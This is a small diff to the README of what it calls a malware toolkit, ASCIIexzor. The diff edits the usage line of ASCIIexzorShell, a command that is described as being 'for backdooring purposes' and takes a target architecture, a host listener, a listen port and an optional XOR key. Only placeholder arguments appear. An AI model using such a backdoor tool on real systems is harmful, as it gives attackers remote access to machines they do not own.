@@ -6,7 +6,7 @@ In order to use my malware toolkit you have first to install the ASCIIexzor suit
 
 for backdooring purposes :
 ```bash
-ASCIIexzorShell -a <target arch> -h <host listener> -p <listen port(1337 - 50000)> [opt][-v <varname> -k <xor key>]
+ASCIIexzorShell -a <target arch> -h <host listener> -p <listen port> [opt][-v <varname> -k <xor key>]
 ```
 for testing purposes : 
 ```bash
